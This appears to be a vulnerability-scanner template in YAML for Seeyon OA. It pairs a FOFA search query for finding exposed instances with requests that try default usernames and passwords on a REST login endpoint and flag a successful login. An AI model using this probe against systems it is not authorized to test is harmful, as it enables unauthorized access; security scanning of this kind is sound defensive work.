  severity: critical
  tags:
  - 资源管理错误
  finger: 致远OA
  fofa: app="致远互联-OA" && is_domain=false
variables:
  username: 'seeyon-guest

    system

    audit-admin

    group-admin

    '
  passwd: 'share.do

    genericController.do

    123456

    admin123

    '
firstRequest:
  method: POST
  path: /seeyon/rest/authentication/ucpcLogin?login_username=n0tf0und&login_password=n0tf0und&ticket=
  headers:
    Content-type: application/x-www-form-urlencoded
  expression: 'status_code == 200 &&

    contains(body,"\"LoginOK\":\"fail\"")

    '
requests:
- method: POST
  path: /seeyon/rest/authentication/ucpcLogin?login_username={{.username}}&login_password={{.passwd}}&ticket=
  headers:
    Content-type: application/x-www-form-urlencoded
  expression: 'status_code == 200 &&

    contains(body,"\"LoginOK\":\"OK\"") &&

    contains(body,"\"loginName\"")

    '
transport: http
